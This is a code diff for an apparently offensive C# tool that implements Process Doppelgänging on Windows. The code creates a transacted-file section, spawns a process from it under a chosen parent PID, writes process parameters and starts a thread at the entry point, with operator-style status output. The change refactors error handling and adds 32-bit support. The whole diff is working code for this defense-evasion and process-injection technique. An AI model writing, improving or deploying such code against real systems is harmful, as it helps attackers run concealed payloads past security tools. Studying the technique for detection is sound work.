@@ -16,7 +16,6 @@ namespace ProcessDoppelgaenging.Library
         {
             NTSTATUS ntstatus;
             IntPtr hTransactedSection;
-            IntPtr hDoppelgaengingProcess;
             IntPtr pPeb;
             IntPtr pImageBase;
             IntPtr pRemoteEntryPoint;
@@ -25,6 +24,8 @@ namespace ProcessDoppelgaenging.Library
             PeFile.IMAGE_FILE_MACHINE archImage;
             bool is64BitImage;
             string imagePathName;
+            bool status = false;
+            IntPtr hDoppelgaengingProcess = IntPtr.Zero;
             string tempFilePath = Path.GetTempFileName();
 
             if (Environment.Is64BitOperatingSystem && (IntPtr.Size != 8))
@@ -90,170 +91,112 @@ namespace ProcessDoppelgaenging.Library
                 Console.WriteLine("    [*] Image File Path : {0}", imagePathName);
             }
 
-            Console.WriteLine("[>] Trying to create transacted file.");
-            Console.WriteLine("    [*] File Path : {0}", tempFilePath);
-
-            hTransactedSection = Utilities.CreateTransactedSection(
-                tempFilePath,
-                imageData);
-
-            if (hTransactedSection == Win32Consts.INVALID_HANDLE_VALUE)
+            do
             {
-                try
+                Console.WriteLine("[>] Trying to create transacted file.");
+                Console.WriteLine("    [*] File Path : {0}", tempFilePath);
+
+                hTransactedSection = Utilities.CreateTransactedSection(
+                    tempFilePath,
+                    imageData);
+
+                if (hTransactedSection == Win32Consts.INVALID_HANDLE_VALUE)
+                    break;
+
+                hDoppelgaengingProcess = Utilities.CreateTransactedProcess(
+                    hTransactedSection,
+                    ppid);
+
+                if (hDoppelgaengingProcess == IntPtr.Zero)
+                    break;
+
+                Console.WriteLine("[>] Trying to get ntdll!_PEB address for the doppelgaenging process.");
+
+                status = Helpers.GetProcessBasicInformation(
+                    hDoppelgaengingProcess,
+                    out PROCESS_BASIC_INFORMATION pbi);
+
+                if (!status)
                 {
-                    if (File.Exists(tempFilePath))
-                        File.Delete(tempFilePath);
+                    break;
                 }
-                catch
+                else
                 {
-                    Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
-                }
-
-                return false;
-            }
-
-            hDoppelgaengingProcess = Utilities.CreateTransactedProcess(
-                hTransactedSection,
-                ppid);
-            NativeMethods.NtClose(hTransactedSection);
-
-            if (hDoppelgaengingProcess == IntPtr.Zero)
-            {
-                try
-                {
-                    if (File.Exists(tempFilePath))
-                        File.Delete(tempFilePath);
-                }
-                catch
-                {
-                    Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
-                }
-
-                return false;
-            }
-
-            Console.WriteLine("[>] Trying to get ntdll!_PEB address for the doppelgaenging process.");
-
-            if (!Helpers.GetProcessBasicInformation(
-                hDoppelgaengingProcess,
-                out PROCESS_BASIC_INFORMATION pbi))
-            {
-                Console.WriteLine("[-] Failed to get ntdll!_PEB address for the doppelgaenging process.");
-
-                try
-                {
-                    if (File.Exists(tempFilePath))
-                        File.Delete(tempFilePath);
-                }
-                catch
-                {
-                    Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
+                    pPeb = pbi.PebBaseAddress;
+                    Console.WriteLine("[+] Got doppelgaenging process basic information.");
+                    Console.WriteLine("    [*] ntdll!_PEB : 0x{0}", pPeb.ToString((IntPtr.Size == 8) ? "X16" : "X8"));
+                    Console.WriteLine("    [*] Process ID : {0}", pbi.UniqueProcessId);
                 }
 
+                Console.WriteLine("[>] Trying to get image base address for the doppelgaenging process.");
+
+                pImageBase = Helpers.GetImageBaseAddress(hDoppelgaengingProcess, pPeb);
+
+                if (pImageBase == IntPtr.Zero)
+                {
+                    break;
+                }
+                else
+                {
+                    Console.WriteLine("[+] Got image base address for the doppelgaenging process.");
+                    Console.WriteLine("    [*] Image Base Address : 0x{0}", pImageBase.ToString((IntPtr.Size == 8) ? "X16" : "X8"));
+                }
+
+                if (Environment.Is64BitProcess)
+                    pRemoteEntryPoint = new IntPtr(pImageBase.ToInt64() + nEntryPointOffset);
+                else
+                    pRemoteEntryPoint = new IntPtr(pImageBase.ToInt32() + nEntryPointOffset);
+
+                Console.WriteLine("[>] Trying to set process parameters to the doppelgaenging process.");
+
+                pRemoteProcessParameters = Utilities.SetProcessParameters(
+                    hDoppelgaengingProcess,
+                    imagePathName,
+                    commandLine,
+                    Environment.CurrentDirectory,
+                    windowTitle);
+
+                if (pRemoteProcessParameters == IntPtr.Zero)
+                    break;
+                else
+                    Console.WriteLine("[+] Process parameters are set successfully.");
+
+                Console.WriteLine("[>] Trying to start doppelgaenging process thread.");
+
+                ntstatus = NativeMethods.NtCreateThreadEx(
+                    out IntPtr hThread,
+                    ACCESS_MASK.THREAD_ALL_ACCESS,
+                    IntPtr.Zero,
+                    hDoppelgaengingProcess,
+                    pRemoteEntryPoint,
+                    IntPtr.Zero,
+                    false,
+                    0,
+                    0,
+                    0,
+                    IntPtr.Zero);
+                status = (ntstatus == Win32Consts.STATUS_SUCCESS);
+
+                if (!status)
+                {
+                    Console.WriteLine("[-] Failed to create thread.");
+                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
+                    Console.WriteLine("[*] In newer version Windows OS (> 1809), this technique may be blocked by kernel protection.");
+                }
+                else
+                {
+                    Console.WriteLine("[+] Thread is resumed successfully.");
+                    NativeMethods.NtClose(hThread);
+                    NativeMethods.NtClose(hDoppelgaengingProcess);
+                    status = true;
+                }
+            } while (false);
+
+            if (hTransactedSection != Win32Consts.INVALID_HANDLE_VALUE)
+                NativeMethods.NtClose(hTransactedSection);
+
+            if (!status && (hDoppelgaengingProcess != IntPtr.Zero))
                 NativeMethods.NtTerminateProcess(hDoppelgaengingProcess, Win32Consts.STATUS_SUCCESS);
-
-                return false;
-            }
-            else
-            {
-                pPeb = pbi.PebBaseAddress;
-                Console.WriteLine("[+] Got doppelgaenging process basic information.");
-                Console.WriteLine("    [*] ntdll!_PEB : 0x{0}", pPeb.ToString((IntPtr.Size == 8) ? "X16" : "X8"));
-                Console.WriteLine("    [*] Process ID : {0}", pbi.UniqueProcessId);
-            }
-
-            Console.WriteLine("[>] Trying to get image base address for the doppelgaenging process.");
-
-            pImageBase = Helpers.GetImageBaseAddress(hDoppelgaengingProcess, pPeb);
-
-            if (pImageBase == IntPtr.Zero)
-            {
-                Console.WriteLine("[-] Failed to get image base address for the doppelgaenging process.");
-
-                try
-                {
-                    if (File.Exists(tempFilePath))
-                        File.Delete(tempFilePath);
-                }
-                catch
-                {
-                    Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
-                }
-
-                NativeMethods.NtTerminateProcess(hDoppelgaengingProcess, Win32Consts.STATUS_SUCCESS);
-
-                return false;
-            }
-            else
-            {
-                Console.WriteLine("[+] Got image base address for the doppelgaenging process.");
-                Console.WriteLine("    [*] Image Base Address : 0x{0}", pImageBase.ToString((IntPtr.Size == 8) ? "X16" : "X8"));
-            }
-
-            pRemoteEntryPoint = new IntPtr(pImageBase.ToInt64() + nEntryPointOffset);
-
-            Console.WriteLine("[>] Trying to set process parameters to the doppelgaenging process.");
-
-            pRemoteProcessParameters = Utilities.SetProcessParameters(
-                hDoppelgaengingProcess,
-                imagePathName,
-                commandLine,
-                Environment.CurrentDirectory,
-                windowTitle);
-
-            if (pRemoteProcessParameters == IntPtr.Zero)
-            {
-                Console.WriteLine("[-] Failed to set process parameters.");
-
-                try
-                {
-                    if (File.Exists(tempFilePath))
-                        File.Delete(tempFilePath);
-                }
-                catch
-                {
-                    Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
-                }
-
-                NativeMethods.NtTerminateProcess(hDoppelgaengingProcess, Win32Consts.STATUS_SUCCESS);
-
-                return false;
-            }
-            else
-            {
-                Console.WriteLine("[+] Process parameters are set successfully.");
-            }
-
-            Console.WriteLine("[>] Trying to start doppelgaenging process thread.");
-
-            ntstatus = NativeMethods.NtCreateThreadEx(
-                out IntPtr hThread,
-                ACCESS_MASK.THREAD_ALL_ACCESS,
-                IntPtr.Zero,
-                hDoppelgaengingProcess,
-                pRemoteEntryPoint,
-                IntPtr.Zero,
-                false,
-                0,
-                0,
-                0,
-                IntPtr.Zero);
-
-            if (ntstatus != Win32Consts.STATUS_SUCCESS)
-            {
-                Console.WriteLine("[-] Failed to create thread.");
-                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
-                Console.WriteLine("[*] In newer version Windows OS (> 1809), this technique may be blocked by kernel protection.");
-
-                NativeMethods.NtTerminateProcess(hDoppelgaengingProcess, Win32Consts.STATUS_SUCCESS);
-            }
-            else
-            {
-                Console.WriteLine("[+] Thread is resumed successfully.");
-            }
-
-            NativeMethods.NtClose(hThread);
-            NativeMethods.NtClose(hDoppelgaengingProcess);
 
             try
             {
@@ -265,7 +208,7 @@ namespace ProcessDoppelgaenging.Library
                 Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
             }
 
-            return (ntstatus == Win32Consts.STATUS_SUCCESS);
+            return status;
         }
     }
 }
